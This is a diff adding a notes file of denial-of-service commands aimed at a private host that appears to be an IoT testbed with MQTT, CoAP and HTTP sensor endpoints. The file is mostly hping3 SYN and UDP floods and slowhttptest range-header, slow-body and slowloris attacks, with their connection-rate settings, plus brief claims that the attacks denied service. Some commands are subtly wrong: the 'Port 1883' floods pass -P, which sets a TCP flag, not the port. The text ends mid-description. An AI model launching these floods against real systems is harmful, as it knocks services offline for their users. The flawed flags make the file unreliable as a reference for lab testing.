@@ -1,0 +1,56 @@
+sudo hping3 -S --fast  -p 5683 --udp 192.168.1.5
+
+TCP FLOOD to no Port:
+
+Sends TCP packets to the following host slowing down the server and generating unecessary traffic to it
+Different speed were tested
+
+sudo hping3 -S --flood  192.168.1.5
+sudo hping3 -S --faster  192.168.1.5
+sudo hping3 -S --fast  192.168.1.5
+
+TCP FLOOD to Port 1883 
+
+Sends TCP packets to the following host on Port 1883 corresponding to MQTT server, denying completly its communication to devices
+Different speed were tested and flood all the network with unecessary traffic
+
+sudo hping3 -S --flood -P 1883 192.168.1.5
+sudo hping3 -S --faster -P 1883 192.168.1.5
+sudo hping3 -S --fast -P 1883 192.168.1.5
+
+HTTP FLOOD to Port 1880
+
+Each one of the following commands POST or Request data from an http endpoint of the HTTP server endpoint on Port 1880
+
+//Sends malicious Range Request header data. It was used to disconfigurating the Network flow by trying to post to different HTTP endpoits header requests and sucessfully denied HTTP protocol and flood all the network with unecessary traffic
+
+Connection rate is  started 2000 connections in the beggining,
+slowhttptest -R -c 2000 -g -o output -i 10 -r 300 -t POST -u http://192.168.1.5:1880/dht11_h -x 300 -p 3
+slowhttptest -R -c 2000 -g -o output -i 10 -r 300 -t POST -u http://192.168.1.5:1880/ds18b20 -x 300 -p 3
+slowhttptest -R -c 2000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/dht11_t -x 300 -p 3
+
+//Resquest malicious Range Request header data.
+
+slowhttptest -R -c 2000 -g -o output -i 10 -r 200 -t GET -u http://192.168.1.5:1880/check -x 300 -p 3
+
+
+
+//Sends POSTs of unfinished HTTP message bodies.
+
+Connection rate is  started 1000 connections in the beggining, being stooped and changed to 8000 and started againthroughout the attack time, meanwhile the -t GET command is alternavitely being started and stopped. 
+Connection rate is 200 connections per second.
+interval between follow up data for this test is 10 bytes
+Maximum length of follow up data is random value limited by 300 bytes
+Probe connections waits 3 seconds for HTTP response before marking server as DoSed:
+
+slowhttptest -B -c 1000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/dht11_t -x 300 -p 3
+slowhttptest -B -c 1000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/dht11_h -x 300 -p 3
+slowhttptest -B -c 1000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/ds18b20 -x 300 -p 3
+
+
+//Starts in slowLoris mode, requesting unfinished HTTP requests.
+Start a slowloris test starting with 1000 connections, 
+Connection rate is 200 connections per second.
+interval between follow up data for this test is 10 bytes
+Maximum length of follow up data for slowloris is 300 bytes
+Probe connections waits 3 seconds for HTTP response before marking server as DoSed:
